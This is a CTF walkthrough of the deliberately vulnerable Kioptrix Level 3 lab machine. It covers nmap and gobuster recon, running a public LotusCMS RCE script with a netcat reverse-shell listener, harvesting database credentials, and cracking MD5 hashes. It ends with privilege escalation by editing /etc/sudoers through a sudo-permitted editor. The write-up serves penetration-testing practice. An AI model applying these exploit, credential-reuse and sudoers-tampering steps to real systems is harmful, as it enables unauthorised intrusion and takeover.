---
title: Kioptrix3 (Walkthrough)
published: 2025-06-22
description: ⭐ NANO IS HERE ⭐
tags: [Penetration Testing, Red Team, Vulnerability Exploitation, Web Security ,]
image: "./kiop3.1.png"
category: CTF
draft: false
---

> Cover image source: [Source](./kiop3.1.png)

 Introduction
---------------

I’m NANO, and in this write-up, I’ll take you through my journey of exploiting **Kioptrix Level 3**, a vulnerable virtual machine full of challenges. The goal? Root access! I’ll cover the steps from scanning and discovering vulnerabilities to privilege escalation and gaining full control over the system. It’s a mix of web and local exploitation, with some clever privilege escalation techniques along the way.

Step By Step

Let’s dive in and have some fun hacking

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QxhPp0UlvX9kwn3K_RoiBw.png)

1.  Reconnaissance
---------------------

The first step is always **reconnaissance**. To get started, I ran an **Nmap** scan on the target machine to identify open ports and services running on them.

```
nmap -sV -vv -p- 192.168.1.5
```

Nmap Results:
----------------

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
```

We discovered two open ports:

*   **Port 22** → SSH running OpenSSH 4.7p1
*   **Port 80** → HTTP running Apache 2.2.8 with PHP 5.2.4

 1.1 Enumeration with Gobuster
---------------------------------

After discovering the web server running on port 80, I decided to enumerate hidden directories and files using **Gobuster**. This helps uncover admin panels, login portals, config files, or other interesting endpoints.

Gobuster Command Used:
----------------------

```
gobuster dir -u <http://192.168.1.5> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
```

 Interesting Results:
-----------------------

```

modules    (Status: 301)
gallery    (Status: 301)
data       (Status: 403)
core       (Status: 301)
style      (Status: 301)
cache      (Status: 301)
phpmyadmin (Status: 301)
```

*   `/phpmyadmin/` is particularly interesting — it’s a well-known MySQL web interface.
*    **Access is forbidden (403)**, but it might be useful later for privilege escalation or credentials.

So, there’s a web server running. Let’s take a closer look at it

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r9inmgUHLnbXiglkS78AaA.png)

There is a login page in this website

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MZ2xu27I32sdnpbT4Z5UAQ.png)

Proudly Powered by:LotusCMS

There is a version of this service, we need to search in Google for an exploit for it

WE Found RCE For this service LotusCMS

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6FfoHdcD-AplmjEtpLSr9w.png)

 2.Using the Exploit
----------------------

First, I cloned the repo and ran the exploit manually.

```
git clone <https://github.com/Hood3dRob1n/LotusCMS-Exploit>
cd LotusCMS-Exploit
chmod +x lotusRCE.sh
```

Usage:
---------

```
./lotusRCE.sh <target_ip> <cms_path>
# Example:
./lotusRCE.sh 192.168.1.5 /
```

Before launching the exploit, I started a Netcat listener to catch the reverse shell:

```
nc -lvnp 4444
```

Then IT executed 

 Once you catch the shell on your listener:
---------------------------------------------

Now we upgrade it step by step:

```
which python 
/usr/bin/python
``````
```

python -c 'import pty; pty.spawn("/bin/bash")'
```
^Z
```
stty raw -echo;fg
click enter
export TERM=xterm
```



 3. Exploring the Web Root Directory
--------------------------------------

After getting the shell, I started exploring the web root to look for interesting files or directories:


``
```
cd /home/www/kioptrix3.com
ls
```

 I found several directories that stood out:

```
kotlin
CopyEdit
cache  core  data  gallery  modules  ...
```

I navigated into the `gallery/` folder because the name suggested it might hold important files:

```
cd gallery/
ls
```

 There were many PHP files and folders — some looked related to admin or configuration:

*   `gadmin/`
*   `gconfig.php`
*   `login.php`
*   `register.php`
*   `db.sql`

 4. Credentials Found in gconfig.php
--------------------------------------

One of the most interesting files was `gconfig.php`, which likely stores configuration details. When I opened it, I found this:

```
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
```

 **We successfully found database credentials:**

*   **Username:** `root`
*   **Password:** `fuckeyou`

This is a valuable find — we can try using these credentials to:

*   Access the MySQL database directly
*   Attempt login on the main site
*   Reuse them across other services

However, during our enumeration, we found a hidden `phpmyadmin` page using **Gobuster**, so **our next move should be to try these credentials there**.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oOg8dh_BZiIKOv64mcEiow.png)

 **Login Successful**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_SSQYWR0sXmuzh8a9gjZag.png)

We were presented with **three databases** on the left panel:

*   `information_schema(17)`
*   `mysql`
*   `gallery` 

We focused on the `gallery` database, since it matches the site’s purpose.

click gallery

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tCqtHVO0Oo06E3vC2mCIsw.png)

Inside the `gallery` database, we found a table named `dev_accounts`. This table looked interesting

🧬 Exploring the `dev_accounts` Table in phpMyAdmin
---------------------------------------------------

Once inside **phpMyAdmin**, we navigated to the `gallery` database.

 Step-by-Step to View User Credentials:
-----------------------------------------

1.  Clicked on the table `dev_accounts` from the left panel.
2.  On top, we saw several action tabs like:

*   **Browse**
*   **Structure**
*   **SQL**
*   **Insert**
*   **Export**
*   etc

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kRXyUqrowLWHTNGePYNgyQ.png)

1.  We went to the **SQL** tab and ran the following query to dump all data:

```
SELECT * FROM `dev_accounts` WHERE 1;
```

1.  Hit the **Go** button (on the right), then switched to the **Browse** tab.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*atIehPINmN-xMoL5Hb-yfA.png)

Retrieved User Data:
--------------------

We found two users in the `dev_accounts` table:

Username Password Hash dreg `0d3eccfb887aabd50f243b3f155c0f85` loneferret `5badcaf789d3d1d09794d8f021f40f0e`

Both hashes appeared to be in **MD5** format.

Cracking MD5 Password Hashes
-------------------------------

We used [CrackStation](https://crackstation.net/) to crack the hashes:

*   `0d3eccfb887aabd50f243b3f155c0f85` → **Mast3r** (`dreg`)
*   `5badcaf789d3d1d09794d8f021f40f0e` → **starwars** (`loneferret`)

 **Final credentials:**

Username Password dreg Mast3r loneferret starwars

Since we already had a limited shell as `www-data`, we attempted to switch user using the valid credentials we just found:

```
su loneferret
```

 Entered the password: `starwars`

 we successfully switched to the **loneferret** user!

Privilege Escalation 📌
-----------------------

After switching to the user **loneferret**, our goal became clear — gain **root access** on the target machine.

 Step 1: Check for `sudo` permissions
---------------------------------------

The first thing we usually check is if the current user can run any command as root using `sudo`:

```
sudo -l
```

 **Result:**

```
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

 **Interesting!**

User `loneferret` can run `/usr/bin/ht` as root **without a password**.

1.  RUN ht and and edit inside ht Until get root
2.  

`
loneferret@Kioptrix3:/$ sudo /usr/local/bin/ht
![captionless image](https://miro.medium.com/v2/resize:fit:1312/format:webp/1*cy3mzUrBfpI-TII65cLsNA.png)

Since we can run **ht** as root, we can edit any file. Let’s grant ourselves a password‑less bash:

1.  **Open sudoer**

*   Press **F3**, enter `/etc/sudoers` IF You using laptop Press FN+F3

![captionless image](https://miro.medium.com/v2/resize:fit:1312/format:webp/1*JnVtJ4jBXCit5q6WOXVPIA.png)

1.  At the bottom, add:

![captionless image](https://miro.medium.com/v2/resize:fit:1346/format:webp/1*KyPQ9X7E2anWDR1R_sP_uw.png)

*   `Remove this >>>>!<<<< after remove >>> loneferret ALL=(ALL) NOPASSWD: /bin/bash`

1.  **Save & exit**

*   **F2** to save IF You using laptop Press FN+F2
*   **F10** to quit IF You using laptop Press FN+F10

1.  **Spawn a root shell**

![captionless image](https://miro.medium.com/v2/resize:fit:1336/format:webp/1*noimaT-tyVt9fnTf_qdDGg.png)![captionless image](https://miro.medium.com/v2/resize:fit:400/format:webp/1*CMaE65mmpuE-tOwHWeQ3Ww.gif)
